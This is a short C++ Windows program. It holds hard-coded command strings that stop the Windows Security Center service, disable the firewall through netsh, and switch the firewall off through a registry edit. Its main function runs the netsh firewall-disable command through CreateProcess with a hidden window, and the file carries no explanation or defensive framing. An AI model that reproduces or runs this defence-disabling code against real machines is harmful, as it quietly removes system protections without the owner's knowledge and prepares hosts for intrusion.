#include <Windows.h>
#include <iostream>
using namespace std;

TCHAR stopSecurityCenter[] = "cmd.exe /C \"net stop wscsvc\"";
TCHAR disableFirewall[] = "cmd.exe /C \"netsh firewall set opmode mode = disable\"";
TCHAR disableFirewallReg[] = "cmd.exe /C \"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f\"";

void ShellByCreateProcess()
{
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	PROCESS_INFORMATION pi = {};
	
	if (!CreateProcess(NULL, disableFirewall, NULL, NULL, FALSE, HIDE_WINDOW, NULL, NULL, &si, &pi))
	{
		printf("*** ERROR *** Last error: 0x%x\n", GetLastError());
	}
}

int main()
{
	ShellByCreateProcess();
	return 0;
}

